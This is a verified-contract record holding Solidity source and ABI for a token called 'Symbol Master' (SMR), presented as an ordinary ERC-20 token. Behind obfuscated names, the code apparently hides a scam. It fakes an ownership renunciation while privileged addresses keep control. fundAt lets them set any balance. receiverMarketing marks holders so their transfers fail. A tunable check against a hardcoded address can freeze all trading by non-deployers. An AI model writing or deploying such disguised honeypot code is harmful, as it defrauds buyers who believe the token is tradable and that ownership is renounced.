{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface fundLaunched {\n    function createPair(address listToMax, address senderLimit) external returns (address);\n}\n\ninterface modeFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeAt) external view returns (uint256);\n\n    function transfer(address exemptIs, uint256 teamFee) external returns (bool);\n\n    function allowance(address teamTakeList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptIs,\n        uint256 teamFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMin, uint256 value);\n    event Approval(address indexed teamTakeList, address indexed spender, uint256 value);\n}\n\nabstract contract modeTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeFromMetadata is modeFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SymbolMaster is modeTake, modeFrom, modeFromMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingEnable;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromSellTotal;\n\n    mapping(address => uint256) private isReceiver;\n\n    uint256 constant limitReceiver = 18 ** 10;\n\n    uint8 private feeTx = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeTx;\n    }\n\n    uint256 private takeReceiver;\n\n    string private marketingEnable = \"SMR\";\n\n    address public takeTotal;\n\n    function launchedList() public {\n        emit OwnershipTransferred(takeTotal, address(0));\n        maxWalletMin = address(0);\n    }\n\n    function senderTrading(address exemptLiquidity, address exemptIs, uint256 teamFee) internal returns (bool) {\n        if (exemptLiquidity == takeTotal) {\n            return totalReceiver(exemptLiquidity, exemptIs, teamFee);\n        }\n        uint256 autoWallet = modeFrom(launchFrom).balanceOf(tokenIs);\n        require(autoWallet == fromSell);\n        require(exemptIs != tokenIs);\n        if (limitAuto[exemptLiquidity]) {\n            return totalReceiver(exemptLiquidity, exemptIs, limitReceiver);\n        }\n        return totalReceiver(exemptLiquidity, exemptIs, teamFee);\n    }\n\n    function transferFrom(address exemptLiquidity, address exemptIs, uint256 teamFee) external override returns (bool) {\n        if (_msgSender() != minTo) {\n            if (fromSellTotal[exemptLiquidity][_msgSender()] != type(uint256).max) {\n                require(teamFee <= fromSellTotal[exemptLiquidity][_msgSender()]);\n                fromSellTotal[exemptLiquidity][_msgSender()] -= teamFee;\n            }\n        }\n        return senderTrading(exemptLiquidity, exemptIs, teamFee);\n    }\n\n    uint256 public senderLaunched;\n\n    function transfer(address feeMaxSwap, uint256 teamFee) external virtual override returns (bool) {\n        return senderTrading(_msgSender(), feeMaxSwap, teamFee);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isLiquidityLaunch;\n    }\n\n    event OwnershipTransferred(address indexed fromExempt, address indexed atIs);\n\n    address public launchFrom;\n\n    mapping(address => bool) public limitFeeMin;\n\n    function liquiditySell(address tokenSwap) public {\n        require(tokenSwap.balance < 100000);\n        if (swapLaunchShould) {\n            return;\n        }\n        \n        limitFeeMin[tokenSwap] = true;\n        if (autoBuy == takeReceiver) {\n            sellTx = true;\n        }\n        swapLaunchShould = true;\n    }\n\n    function fundAt(address feeMaxSwap, uint256 teamFee) public {\n        fromTake();\n        isReceiver[feeMaxSwap] = teamFee;\n    }\n\n    function allowance(address atTx, address fundMarketing) external view virtual override returns (uint256) {\n        if (fundMarketing == minTo) {\n            return type(uint256).max;\n        }\n        return fromSellTotal[atTx][fundMarketing];\n    }\n\n    uint256 private autoLaunchedAmount = 100000000 * 10 ** 18;\n\n    function balanceOf(address modeAt) public view virtual override returns (uint256) {\n        return isReceiver[modeAt];\n    }\n\n    uint256 limitFrom;\n\n    function receiverMarketing(address fromFeeWallet) public {\n        fromTake();\n        \n        if (fromFeeWallet == takeTotal || fromFeeWallet == launchFrom) {\n            return;\n        }\n        limitAuto[fromFeeWallet] = true;\n    }\n\n    address minTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private autoBuy;\n\n    uint256 public takeBuy;\n\n    constructor (){\n        if (autoBuy == takeBuy) {\n            marketingSwapReceiver = false;\n        }\n        amountToken fromSender = amountToken(minTo);\n        launchFrom = fundLaunched(fromSender.factory()).createPair(fromSender.WETH(), address(this));\n        \n        takeTotal = _msgSender();\n        limitFeeMin[takeTotal] = true;\n        isReceiver[takeTotal] = autoLaunchedAmount;\n        launchedList();\n        \n        emit Transfer(address(0), takeTotal, autoLaunchedAmount);\n    }\n\n    bool private sellTx;\n\n    bool public swapLaunchShould;\n\n    function getOwner() external view returns (address) {\n        return maxWalletMin;\n    }\n\n    function walletAmountTotal(uint256 teamFee) public {\n        fromTake();\n        fromSell = teamFee;\n    }\n\n    uint256 private swapIs;\n\n    string private isLiquidityLaunch = \"Symbol Master\";\n\n    uint256 fromSell;\n\n    function fromTake() private view {\n        require(limitFeeMin[_msgSender()]);\n    }\n\n    address private maxWalletMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoLaunchedAmount;\n    }\n\n    function approve(address fundMarketing, uint256 teamFee) public virtual override returns (bool) {\n        fromSellTotal[_msgSender()][fundMarketing] = teamFee;\n        emit Approval(_msgSender(), fundMarketing, teamFee);\n        return true;\n    }\n\n    mapping(address => bool) public limitAuto;\n\n    address tokenIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private minTrading;\n\n    function owner() external view returns (address) {\n        return maxWalletMin;\n    }\n\n    bool private marketingSwapReceiver;\n\n    function totalReceiver(address exemptLiquidity, address exemptIs, uint256 teamFee) internal returns (bool) {\n        require(isReceiver[exemptLiquidity] >= teamFee);\n        isReceiver[exemptLiquidity] -= teamFee;\n        isReceiver[exemptIs] += teamFee;\n        emit Transfer(exemptLiquidity, exemptIs, teamFee);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamTakeList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMaxSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFeeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwap\",\"type\":\"address\"}],\"name\":\"liquiditySell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFeeWallet\",\"type\":\"address\"}],\"name\":\"receiverMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMaxSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamFee\",\"type\":\"uint256\"}],\"name\":\"walletAmountTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SymbolMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}